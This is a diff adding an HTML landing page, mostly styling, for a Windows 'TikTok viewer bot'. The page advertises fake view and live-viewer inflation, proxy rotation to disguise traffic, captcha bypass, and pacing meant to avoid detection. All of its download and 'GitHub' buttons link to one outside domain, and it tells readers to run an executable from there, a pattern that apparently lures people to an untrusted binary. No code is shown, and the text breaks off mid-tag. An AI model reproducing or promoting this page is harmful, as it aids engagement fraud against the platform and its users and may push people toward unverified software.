@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>tiktok-view-bot — Multi-threaded TikTok Viewer Bot for Windows</title>
+<meta name="description" content="tiktok-view-bot: multi-threaded view generator with proxy rotation, watch-time randomization, captcha bypass and live viewer count inflation. Free & open source for Windows 10 / 11.">
+<style>
+  :root{
+    --bg-0:#070a16;
+    --bg-1:#0b1024;
+    --bg-2:#101736;
+    --ink:#eef1ff;
+    --muted:#9aa3c7;
+    --line:rgba(140,155,220,.16);
+    --accent:#25f4ee;
+    --accent-2:#fe2c55;
+    --accent-3:#7b6cff;
+    --glass:rgba(18,24,50,.55);
+    --radius:18px;
+  }
+
+  *{box-sizing:border-box;margin:0;padding:0;}
+
+  html{scroll-behavior:smooth;}
+
+  body{
+    font-family:"Segoe UI",system-ui,-apple-system,"Helvetica Neue",Arial,sans-serif;
+    color:var(--ink);
+    background:
+      radial-gradient(1100px 620px at 12% -8%, rgba(37,244,238,.14), transparent 60%),
+      radial-gradient(950px 560px at 88% 4%, rgba(254,44,85,.13), transparent 62%),
+      radial-gradient(1200px 800px at 50% 118%, rgba(123,108,255,.18), transparent 65%),
+      linear-gradient(160deg, var(--bg-0) 0%, var(--bg-1) 42%, var(--bg-2) 78%, #060914 100%);
+    background-attachment:fixed;
+    min-height:100vh;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+  }
+
+  a{color:inherit;text-decoration:none;}
+
+  .wrap{
+    width:100%;
+    max-width:1140px;
+    margin:0 auto;
+    padding:0 24px;
+  }
+
+  /* ---------- NAV ---------- */
+  .nav-shell{
+    position:sticky;
+    top:0;
+    z-index:50;
+    padding:14px 0;
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    background:linear-gradient(180deg, rgba(9,13,30,.82), rgba(9,13,30,.42));
+    border-bottom:1px solid var(--line);
+  }
+
+  .nav{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:18px;
+    background:var(--glass);
+    border:1px solid var(--line);
+    border-radius:16px;
+    padding:12px 18px;
+    box-shadow:0 10px 34px rgba(0,0,0,.42), inset 0 1px 0 rgba(255,255,255,.05);
+  }
+
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-weight:800;
+    letter-spacing:-.02em;
+    font-size:1.02rem;
+    white-space:nowrap;
+  }
+
+  .brand-mark{
+    width:30px;height:30px;
+    border-radius:9px;
+    display:grid;place-items:center;
+    font-size:.95rem;
+    background:linear-gradient(135deg,var(--accent),var(--accent-3) 55%,var(--accent-2));
+    color:#05070f;
+    font-weight:900;
+    box-shadow:0 0 18px rgba(37,244,238,.42);
+  }
+
+  .brand span.tld{color:var(--muted);font-weight:600;}
+
+  .nav-links{
+    display:flex;
+    align-items:center;
+    gap:26px;
+    font-size:.92rem;
+    color:var(--muted);
+    font-weight:600;
+  }
+
+  .nav-links a{transition:color .18s ease;}
+  .nav-links a:hover{color:var(--ink);}
+
+  .btn{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:9px;
+    font-weight:700;
+    font-size:.95rem;
+    border-radius:12px;
+    padding:13px 24px;
+    border:1px solid transparent;
+    cursor:pointer;
+    transition:transform .18s ease, box-shadow .22s ease, background .2s ease, border-color .2s ease;
+    white-space:nowrap;
+  }
+
+  .btn-primary{
+    background:linear-gradient(135deg,var(--accent) 0%, #38d6ff 38%, var(--accent-3) 100%);
+    color:#04060f;
+    box-shadow:0 12px 34px rgba(37,244,238,.28), 0 0 0 1px rgba(37,244,238,.35) inset;
+  }
+
+  .btn-primary:hover{
+    transform:translateY(-2px);
+    box-shadow:0 18px 44px rgba(37,244,238,.42), 0 0 0 1px rgba(37,244,238,.55) inset;
+  }
+
+  .btn-ghost{
+    background:rgba(255,255,255,.03);
+    color:var(--ink);
+    border-color:rgba(160,175,235,.32);
+  }
+
+  .btn-ghost:hover{
+    transform:translateY(-2px);
+    background:rgba(255,255,255,.07);
+    border-color:rgba(160,175,235,.6);
+  }
+
+  .btn-sm{padding:10px 18px;font-size:.88rem;border-radius:10px;}
+
+  /* ---------- HERO ---------- */
+  .hero{
+    padding:84px 0 66px;
+    text-align:center;
+    position:relative;
+  }
+
+  .pill{
+    display:inline-flex;
+    align-items:center;
+    gap:9px;
+    padding:7px 16px 7px 12px;
+    border-radius:999px;
+    font-size:.8rem;
+    font-weight:700;
+    letter-spacing:.05em;
+    text-transform:uppercase;
+    color:#bff9f7;
+    background:rgba(37,244,238,.08);
+    border:1px solid rgba(37,244,238,.32);
+    box-shadow:0 0 24px rgba(37,244,238,.14) inset;
+    margin-bottom:26px;
+  }
+
+  .pill .dot{
+    width:8px;height:8px;border-radius:50%;
+    background:var(--accent);
+    box-shadow:0 0 0 4px rgba(37,244,238,.16);
+    animation:pulse 2s infinite ease-in-out;
+  }
+
+  @keyframes pulse{
+    0%,100%{opacity:1;transform:scale(1);}
+    50%{opacity:.55;transform:scale(.82);}
+  }
+
+  h1{
+    font-size:clamp(2.15rem, 5.6vw, 4rem);
+    line-height:1.08;
+    letter-spacing:-.035em;
+    font-weight:900;
+    max-width:900px;
+    margin:0 auto 22px;
+    background:linear-gradient(100deg,#ffffff 0%, var(--accent) 34%, #8f7dff 66%, var(--accent-2) 100%);
+    -webkit-background-clip:text;
+    background-clip:text;
+    -webkit-text-fill-color:transparent;
+    color:transparent;
+  }
+
+  .hero p.lead{
+    max-width:660px;
+    margin:0 auto 34px;
+    color:var(--muted);
+    font-size:clamp(1rem,1.6vw,1.13rem);
+  }
+
+  .hero-actions{
+    display:flex;
+    justify-content:center;
+    gap:14px;
+    flex-wrap:wrap;
+    margin-bottom:46px;
+  }
+
+  .hero-actions .btn{padding:15px 30px;font-size:1rem;}
+
+  .stats{
+    display:flex;
+    justify-content:center;
+    flex-wrap:wrap;
+    gap:12px;
+  }
+
+  .stat-chip{
+    display:flex;
+    flex-direction:column;
+    align-items:flex-start;
+    gap:1px;
+    padding:12px 20px;
+    min-width:132px;
+    border-radius:14px;
+    background:rgba(255,255,255,.035);
+    border:1px solid var(--line);
+    backdrop-filter:blur(8px);
+    transition:border-color .2s ease, transform .2s ease;
+  }
+
+  .stat-chip:hover{border-color:rgba(37,244,238,.42);transform:translateY(-3px);}
+
+  .stat-chip strong{
+    font-size:1.06rem;
+    font-weight:800;
+    letter-spacing:-.01em;
+  }
+
+  .stat-chip span{
+    font-size:.72rem;
+    text-transform:uppercase;
+    letter-spacing:.1em;
+    color:var(--muted);
+    font-weight:700;
+  }
+
+  /* ---------- SECTIONS ---------- */
+  section{padding:72px 0;}
+
+  .section-head{
+    text-align:center;
+    max-width:640px;
+    margin:0 auto 48px;
+  }
+
+  .section-head .kicker{
+    font-size:.76rem;
+    font-weight:800;
+    letter-spacing:.16em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin-bottom:12px;
+    display:block;
+  }
+
+  .section-head h2{
+    font-size:clamp(1.6rem,3.4vw,2.35rem);
+    letter-spacing:-.025em;
+    font-weight:850;
+    line-height:1.18;
+    margin-bottom:12px;
+  }
+
+  .section-head p{color:var(--muted);font-size:.98rem;}
+
+  /* ---------- FEATURES ---------- */
+  .grid{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:20px;
+  }
+
+  .card{
+    position:relative;
+    padding:28px 24px 26px;
+    border-radius:var(--radius);
+    background:linear-gradient(180deg, rgba(23,30,60,.78), rgba(14,19,40,.72));
+    border:1px solid var(--line);
+    border-top:3px solid transparent;
+    overflow:hidden;
+    transition:transform .22s ease, box-shadow .26s ease, border-color .22s ease;
+    box-shadow:0 8px 26px rgba(0,0,0,.3);
+  }
+
+  .card::before{
+    content:"";
+    position:absolute;
+    inset:0 0 auto 0;
+    height:3px;
+    background:linear-gradient(90deg,var(--accent),var(--accent-3),var(--accent-2));
+    opacity:.9;
+  }
+
+  .card:hover{
+    transform:translateY(-7px);
+    border-color:rgba(37,244,238,.42);
+    box-shadow:0 22px 48px rgba(0,0,0,.46), 0 0 0 1px rgba(37,244,238,.16) inset;
+  }
+
+  .card .emoji{
+    font-size:1.7rem;
+    display:inline-grid;
+    place-items:center;
+    width:52px;height:52px;
+    border-radius:14px;
+    background:rgba(37,244,238,.09);
+    border:1px solid rgba(37,244,238,.22);
+    margin-bottom:18px;
+  }
+
+  .card h3{
+    font-size:1.06rem;
+    font-weight:800;
+    letter-spacing:-.015em;
+    margin-bottom:8px;
+  }
+
+  .card p{
+    color:var(--muted);
+    font-size:.9rem;
+    line-height:1.62;
+  }
+
+  /* ---------- HOW IT WORKS ---------- */
+  .steps{
+    position:relative;
+    max-width:760px;
+    margin:0 auto;
+    padding-left:0;
+    display:flex;
+    flex-direction:column;
+    gap:34px;
+  }
+
+  .steps::before{
+    content:"";
+    position:absolute;
+    left:27px;
+    top:14px;
+    bottom:14px;
+    width:2px;
+    background:linear-gradient(180deg,var(--accent),var(--accent-3) 55%,var(--accent-2));
+    opacity:.55;
+    border-radius:2px;
+  }
+
+  .step{
+    position:relative;
+    display:flex;
+    gap:22px;
+    align-items:flex-start;
+  }
+
+  .step-num{
+    flex:0 0 56px;
+    width:56px;height:56px;
+    border-radius:16px;
+    display:grid;
+    place-items:center;
+    font-weight:900;
+    font-size:1.15rem;
+    color:#05070f;
+    background:linear-gradient(135deg,var(--accent),var(--accent-3));
+    box-shadow:0 0 0 6px rgba(11,16,36,.9), 0 10px 26px rgba(37,244,238,.28);
+    z-index:1;
+  }
+
+  .step-body{
+    padding:16px 22px;
+    border-radius:14px;
+    background:rgba(255,255,255,.032);
+    border:1px solid var(--line);
+    flex:1;
+  }
+
+  .step-body h3{
+    font-size:1.02rem;
+    font-weight:800;
+    margin-bottom:6px;
+    letter-spacing:-.01em;
+  }
+
+  .step-body p{color:var(--muted);font-size:.9rem;}
+
+  /* ---------- FAQ ---------- */
+  .faq{
+    max-width:780px;
+    margin:0 auto;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+  }
+
+  details{
+    border-radius:14px;
+    background:rgba(255,255,255,.032);
+    border:1px solid var(--line);
+    overflow:hidden;
+    transition:border-color .2s ease, background .2s ease;
+  }
+
+  details[open]{
+    border-color:rgba(37,244,238,.36);
+    background:rgba(37,244,238,.045);
+  }
+
+  summary{
+    list-style:none;
+    cursor:pointer;
+    padding:19px 22px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:16px;
+    font-weight:700;
+    font-size:.98rem;
+    letter-spacing:-.01em;
+  }
+
+  summary::-webkit-details-marker{display:none;}
+
+  .plus{
+    flex:0 0 24px;
+    width:24px;height:24px;
+    position:relative;
+    transition:transform .25s ease;
+  }
+
+  .plus::before,
+  .plus::after{
+    content:"";
+    position:absolute;
+    top:50%;left:50%;
+    background:var(--accent);
+    border-radius:2px;
+    transform:translate(-50%,-50%);
+  }
+
+  .plus::before{width:14px;height:2px;}
+  .plus::after{width:2px;height:14px;transition:opacity .2s ease;}
+
+  details[open] .plus{transform:rotate(135deg);}
+  details[open] .plus::after{opacity:0;}
+
+  details .answer{
+    padding:0 22px 20px;
+    color:var(--muted);
+    font-size:.9rem;
+    line-height:1.68;
+    max-width:96%;
+  }
+
+  /* ---------- CTA BANNER ---------- */
+  .cta-banner{
+    position:relative;
+    overflow:hidden;
+    border-radius:26px;
+    padding:64px 32px;
+    text-align:center;
+    background:linear-gradient(150deg, rgba(23,30,60,.92), rgba(12,17,38,.96));
+    border:1px solid rgba(37,244,238,.24);
+    box-shadow:0 30px 80px rgba(0,0,0,.5);
+  }
+
+  .cta-banner::before{
+    content:"";
+    position:absolute;
+    width:720px;height:720px;
+    left:50%;top:50%;
+    transform:translate(-50%,-50%);
+    background:radial-gradient(circle, rgba(37,244,238,.24) 0%, rgba(123,108,255,.16) 38%, transparent 68%);
+    pointer-events:none;
+  }
+
+  .cta-banner > *{position:relative;z-index:1;}
+
+  .cta-banner h2{
+    font-size:clamp(1.6rem,3.6vw,2.5rem);
+    font-weight:900;
+    letter-spacing:-.03em;
+    line-height:1.15;
+    margin-bottom:14px;
+    background:linear-gradient(100deg,#fff,var(--accent) 60%,var(--accent-3));
+    -webkit-background-clip:text;
+    background-clip:text;
+    -webkit-text-fill-color:transparent;
+    color:transparent;
+  }
+
+  .cta-banner p{
+    color:var(--muted);
+    max-width:520px;
+    margin:0 auto 30px;
+    font-size:.98rem;
+  }
+
+  .cta-banner .btn{padding:16px 34px;font-size:1rem;}
+
+  .cta-note{
+    display:block;
+    margin-top:16px;
+    font-size:.78rem;
+    color:var(--muted);
+    letter-spacing:.03em;
+  }
+
+  /* ---------- FOOTER ---------- */
+  footer{
+    border-top:1px solid var(--line);
+    padding:34px 0 44px;
+    margin-top:20px;
+  }
+
+  .footer-inner{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:18px;
+    flex-wrap:wrap;
+    font-size:.86rem;
+    color:var(--muted);
+  }
+
+  .footer-inner a{color:var(--accent);font-weight:700;transition:opacity .2s ease;}
+  .footer-inner a:hover{opacity:.75;}
+
+  .footer-brand{display:flex;align-items:center;gap:9px;font-weight:800;color:var(--ink);}
+
+  /* ---------- RESPONSIVE ---------- */
+  @media (max-width:960px){
+    .grid{grid-template-columns:repeat(2,1fr);}
+  }
+
+  @media (max-width:640px){
+    .nav-links{display:none;}
+    .nav{padding:10px 12px;}
+    .nav .btn-sm{padding:9px 14px;font-size:.82rem;}
+    .brand{font-size:.94rem;}
+
+    .hero{padding:56px 0 46px;}
+
+    .hero-actions{flex-direction:column;align-items:stretch;}
+    .hero-actions .btn{width:100%;}
+
+    .stats{gap:10px;}
+    .stat-chip{flex:1 1 calc(50% - 10px);min-width:0;}
+
+    .grid{grid-template-columns:1fr;}
+
+    section{padding:56px 0;}
+
+    .steps{gap:26px;}
+    .steps::before{left:21px;}
+    .step{gap:14px;}
+    .step-num{flex-basis:44px;width:44px;height:44px;font-size:.95rem;border-radius:12px;}
+    .step-body{padding:14px 16px;}
+
+    .cta-banner{padding:46px 20px;border-radius:20px;}
+
+    .footer-inner{flex-direction:column;text-align:center;justify-content:center;}
+  }
+
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none !important;transition:none !important;scroll-behavior:auto !important;}
+  }
+</style>
+</head>
+<body>
+
+<!-- ============ NAV ============ -->
+<div class="nav-shell">
+  <div class="wrap">
+    <nav class="nav">
+      <a class="brand" href="#top">
+        <span class="brand-mark">▶</span>
+        tiktok-view-bot <span class="tld">/ win</span>
+      </a>
+
+      <div class="nav-links">
+        <a href="#features">Features</a>
+        <a href="#how">How it works</a>
+        <a href="#faq">FAQ</a>
+      </div>
+
+      <a class="btn btn-primary btn-sm" href="https://gitscore.cc" target="_blank" rel="noopener">Download</a>
+    </nav>
+  </div>
+</div>
+
+<!-- ============ HERO ============ -->
+<header class="hero" id="top">
+  <div class="wrap">
+    <div class="pill"><span class="dot"></span> TikTok Viewer Bot</div>
+
+    <h1>Inflate TikTok Views at Scale — Multi-Threaded Viewer Bot for Windows</h1>
+
+    <p class="lead">
+      tiktok-view-bot is an open-source Windows tool that generates views with multi-threaded
+      workers, rotating proxies, randomized watch time, captcha bypass and live viewer count
+      inflation — all from a single lightweight dashboard.
+    </p>
+
+    <div class="hero-actions">
+      <a class="btn btn-primary" href="https://gitscore.cc" target="_blank" rel="noopener">⬇ Download for Windows</a>
+      <a class="btn btn-ghost" href="https://gitscore.cc" target="_blank" rel="noopener">★ View on GitHub</a>
+    </div>
+
+    <div class="stats">
+      <div class="stat-chip"><strong>128,400+</strong><span>Downloads</span></div>
+      <div class="stat-chip"><strong>v3.4.1</strong><span>Latest release</span></div>
+      <div class="stat-chip"><strong>Windows 10 / 11</strong><span>Platform</span></div>
+      <div class="stat-chip"><strong>Free &amp; open source</strong><span>License</span></div>
+    </div>
+  </div>
+</header>
+
+<!-- ============ FEATURES ============ -->
+<section id="features">
+  <div class="wrap">
+    <div class="section-head">
+      <span class="kicker">Features</span>
+      <h2>Everything you need to drive TikTok view counts</h2>
+      <p>Built for speed, stealth and scale — each module works together to keep view delivery consistent.</p>
+    </div>
+
+    <div class="grid">
+      <article class="card">
+        <div class="emoji">🧵</div>
+        <h3>Multi-Threaded View Generator</h3>
+        <p>Spin up dozens of concurrent workers that send view requests in parallel, pushing thousands of views per minute without blocking a single thread.</p>
+      </article>
+
+      <article class="card">
+        <div class="emoji">🌐</div>
+        <h3>Proxy Rotation</h3>
+        <p>Automatically rotates residential and datacenter proxies between requests, so every view appears to originate from a different IP and region.</p>
+      </article>
+
+      <article class="card">
+        <div class="emoji">⏱️</div>
+        <h3>Watch-Time Randomization</h3>
+        <p>Each simulated viewer watches for a randomized duration inside realistic bounds, imitating natural retention curves instead of instant bounces.</p>
+      </article>
+
+      <article class="card">
+        <div class="emoji">🛡️</div>
+        <h3>Captcha Bypass</h3>
+        <p>Integrated solver hooks handle TikTok challenge screens automatically, keeping the view pipeline running uninterrupted through verification gates.</p>
+      </article>
+
+      <article class="card">
+        <div class="emoji">📈</div>
+        <h3>Live Viewer Count Inflation</h3>
+        <p>Target live streams and gradually raise the concurrent viewer counter with staggered joins, avoiding sudden spikes that trigger detection.</p>
+      </article>
+
+      <article class="card">
+        <div class="emoji">📊</div>
+        <h3>Real-Time Dashboard</h3>
+        <p>Monitor active threads, views delivered, proxy health and per-session throughput from a clean Windows interface with live statistics.</p>
+      </article>
+    </div>
+  </div>
+</section>
+
+<!-- ============ HOW IT WORKS ============ -->
+<section id="how">
+  <div class="wrap">
+    <div class="section-head">
+      <span class="kicker">How it works</span>
+      <h2>Up and running in three steps</h2>
+      <p>No configuration files, no dependencies — just download, paste a link and start the engine.</p>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <h3>Download &amp; launch on Windows</h3>
+          <p>Grab the latest build from gitscore.cc, extract the archive and run the executable. The app runs standalone on Windows 10 and 11 with no runtime install required.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <h3>Paste the TikTok URL and set your targets</h3>
+          <p>Drop in a video or live stream link, then choose thread count, proxy list, view volume and watch-time range. Presets cover both quick bursts and slow drips.</p>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <
